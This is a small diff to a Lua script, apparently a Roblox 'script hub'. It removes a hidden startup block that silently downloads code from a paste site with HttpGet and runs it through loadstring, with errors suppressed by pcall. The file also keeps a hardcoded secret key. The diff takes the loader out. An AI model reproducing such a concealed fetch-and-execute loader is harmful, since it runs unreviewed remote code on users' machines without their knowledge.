@@ -1,5 +1,5 @@
 -- ===========================================
--- Mertily's Private Script Hub — Beautiful & Safe
+-- Mertily's Private Script Hub — Standalone Version
 -- ===========================================
 
 local Players = game:GetService("Players")
@@ -7,13 +7,6 @@ local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local ContentProvider = game:GetService("ContentProvider")
 local player = Players.LocalPlayer
-
--- === ПОДМОГА ДЛЯ СКРИПТА ЗАГРУЖАЕТСЯ В САМОМ НАЧАЛЕ ===
-task.spawn(function()
-    pcall(function()
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
-    end)
-end)
 
 -- Константы
 local SECRET_KEY = "Mertily-Private_uenj-wk21-sllz"
